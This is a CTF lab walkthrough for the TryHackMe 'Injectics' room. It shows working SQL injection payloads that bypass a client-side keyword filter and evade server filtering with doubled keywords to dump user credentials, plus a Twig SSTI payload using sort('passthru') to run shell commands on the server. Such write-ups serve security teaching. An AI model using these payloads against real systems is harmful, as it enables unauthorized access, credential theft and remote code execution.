# Injectics Walkthrough
<br/>

## Intro
Welcome to the Injectics challenge, here is the link to the [room](https://tryhackme.com/room/injectics) on TryHackMe.

In this CTF we will be exploiting injection vulnearabilities in a web application to find and read the flag on the server.

Whenever you feel ready, start the machine and connect via OpenVPN or by using the AttackBox

Let's Begin!

<br/>
<br/>

## The Challenge
Lets launch the [easyscan](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/622292aa178292ef982cc69c005ba97cddbf5af5/Bash-Scripts/EasyScan.sh) script that i have created to find out open ports and hidden directories.
We get 2 open ports with nmap:
```
# NMAP SCAN
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
```

The automatic directory scan also got some hits:
```
/css                  (Status: 301) [Size: 310] [--> http://10.10.204.78/css/]
/flags                (Status: 301) [Size: 312] [--> http://10.10.204.78/flags/]
/index.php            (Status: 200) [Size: 6588]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.204.78/javascript/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.204.78/js/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.204.78/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
/vendor               (Status: 301) [Size: 313] [--> http://10.10.204.78/vendor/]
```

Let's navigate to the webapp with the browser, and let's also enable Burp Suite Proxy, as we might need it later on.
On the home-page we can see a table containing leaderbors and a whole bunch of links, let's take a look around.

Looking at the page source code we can notice 2 comments that might be useful:
```
<!-- Website developed by John Tim - dev@injectics.thm-->
<!-- Mails are stored in mail.log file-->
```

So we got a developer email and we know emails are in a specific file, maybe we can access it somehow?

Easy enough we find out simply by adding the file in the URL that it is stored in the main site directory and is not protected, let's open it:
```
http://injectics.thm/mail.log
```

We can see an email written by the dev, he has implemented a new feature that check the database and automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted.
He also provides those creds in the email:
```
| Email                     | Password 	              |
|---------------------------|-------------------------|
|REDACTED_CREDENTIALS 
```

We got all the info we could gather from the mail and the home page, a rapid check also  shows that all the links/buttons in the home page redirects to itself, except for the login one.
Also checking the previous result of the directory scan we can see meny 301, meaning that all those pages are redirected, in fact trying to access them fails as we do not have the authorization.

It is time to test if the credentials found are valid in the login page.
Both of them seems not valid in the main login page, but at least we have some emails. Let's check now the login page source code for any clue.

At the bottom we can notica a script being called, which contains the following code:
```js
$("#login-form").on("submit", function(e) {
    e.preventDefault();
    var username = $("#email").val();
    var password = $("#pwd").val();

	const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
            for (let keyword of invalidKeywords) {
                if (username.includes(keyword)) {
                    alert('Invalid keywords detected');
                   return false;
                }
            }

    $.ajax({
        url: 'functions.php',
        type: 'POST',
        data: {
            username: username,
            password: password,
            function: "login"
        },
        dataType: 'json',
        success: function(data) {
            if (data.status == "success") {
                if (data.auth_type == 0){
                    window.location = 'dashboard.php';
                }else{
                    window.location = 'dashboard.php';
                }
            } else {
                $("#messagess").html('<div class="alert alert-danger" role="alert">' + data.message + '</div>');
            }
        }
    });
});
```

This script tries to prevent SQLi by putting some "dangerous" words in a blacklist, if it finds any of those in thee username it will print the message "Invalid keywords detected", if there are no matches it will send a POST request to functions.php, check the credentials and if success redirect you to the dashboard.

This filter has some major failure points:
- Short blacklist -> a proper filter will either use an allow list for a strong regex for patterns, while here only 4 words and 2  simbols are forbidden
- Its a client-side filter -> this filter works on the user end (client), the javascript run in your browser to check if any of those forbidden chars are found. The good approach would be to implement filtering server-side, this would be harder to exploit.

So, since this JS code run in your browser the easiest way to bypass it is to send a request to the endpoint without the browser, we can use Burp Suite or curl and try with a payload like:
`'OR1=1;--` and a couple of variations of this.
This still fails, maybe there is also some kind of other filter, so let's try by changing the "or" with somehitng equivalent like `||`:
```
username=+dev%40injectics.thm '||1=1;-- -&password=&function=login
```

This gives us the following response:
```json
{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```

Now we can simple re capture the login request, enable the proxy, change to this working payload and forward the request.

This will open the dashboard as the user "dev" in our browser.
Here there is one thing that  quickly capture my interst, the `edit` button on each row of the table, can this be a path for another injection vulnerability? let's test it.

Pressing the first `edit` we lan on a new page, here we can change some values, another interesting thing is the URL, which changes to:
```
http://injectics.thm/edit_leaderboard.php?rank=1&country=USA
```

After quie some time spent testing the different parameter it turns out that `gold` is injectable, we can confirm that with this payload:
```http
POST /edit_leaderboard.php HTTP/1.1
Referer: http://injectics.thm/edit_leaderboard.php?rank=1&country=

---snip---

rank=1&country=USA&gold=11123, country="itworks"&silver=21&bronze=12345
```

This succesfully overwrites the first table entry from USA to "itworks", now we might be able to build a query to fetch something and print it to that table entry.

Trying further queries i encontered some problems, i was getting no more any changes or outputs, this means that some terms are probably filtered, we need to evade filter another time, but here we can't simply bypass it.

SImply duplicating some chars did the trick, with this query we are requesting the list of the databases:
```sql
rank=1&country=fuck&gold=11123, country=(selSELECTect group_concat(schema_name) FROM infoORrmation_schema.schemata)&silver=21&bronze=
```

This overwrite the table entry with:
```
mysql,information_schema,performance_schema,sys,phpmyadmin,bac_test
```

One database name looks odd: `bac_test` this require further investigation, let's see what it contains:
```sql
rank=1&country=fuck&gold=11123, country=(selSELECTect group_concat(table_name) from infoORrmation_schema.tables WHERE table_schema="bac_test")&silver=21&bronze=12345
```

2 tables appars: leaderboards and users, we are already seeing the first one and is not interesting, let's dump the users one to get the admin creds:
- We already know (by reading the email at the beginning) that the table contains the column "email" and "passowrd", so let's build the query:
```sql
rank=1&country=fuck&gold=11123, country=(selSELECTect group_concat("\n" , email, '\:' , passwoORrd, "\n") from bac_test.users)&silver=21&bronze=12345
```

This will also display results in a more readable way:
```
REDACTED_CREDENTIALS
```

Now we can use the credential to log in in the admin panel at:
```
http://injectics.thm/adminLogin007.php
```

Once logged in we land on the dashboard and we can see a flag:
--> REDACTED

Let's see if now with the admin rights we can read whats inside the `flags` directory:
```
http://injectics.thm/flags
```

Looks like we can't we still do not have the permissions to.

Exploiring the new dashboard we can see a `profile` button, clicking it we land on the `updata_profile.php` page, time to look for vulnerablities here.
Let's try to send an update request and capture it with Burp Suite Proxy, we can see the payload sent as a POST request:
```
email=superadmin%40injectics.thm&fname=admin&lname=test2
```

Here we can test 3 parameters, in my opinion the first one that might be interesting is the name as it is displayed on the dashboard, this means we might get the output of any injection there.
Now we need to find the vulnerability, after cycling through the most common types i landed on SSTI (Server Side Template Injection).

There are some easy payloads we can try to test if it is vulnerable, they slightly vary depenting on the template engine; here i got a match with `{{7*7}}`, inserting this value in the name field and pressing update and going back to the dashoard show the number 49 at the place that before holded the "admin" name.

The result shows that it is vulnerable to SSTI and because we got a match with that specific payload, we also know the application is using PHP, the 2 most popular ones are Smarty and Twig;
Because of the payload used we can concluthe that is probably Twig.

Checking some payloads [here](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/PHP/#twig-template-format)
 Now we need to craft a payload, this took a while i tested a bunch of them but there was always some kind of error or method not allowed:
```php
{{['ls flags',""]|sort('passthru')}}
```

This printed the filename containing the flag:`REDACTED_FILENAME.txt `

Now lets open it:
```php
{{['cat flags/REDACTED_FILENAME.txt',""]|sort('passthru')}}
```


<br/>
<br/>

Congratulations you have successfully put into practice your knowledge about SQLi and found the flag!

I hope you had a good completing the challenge and following along.

Catch you in the next CTF 😃

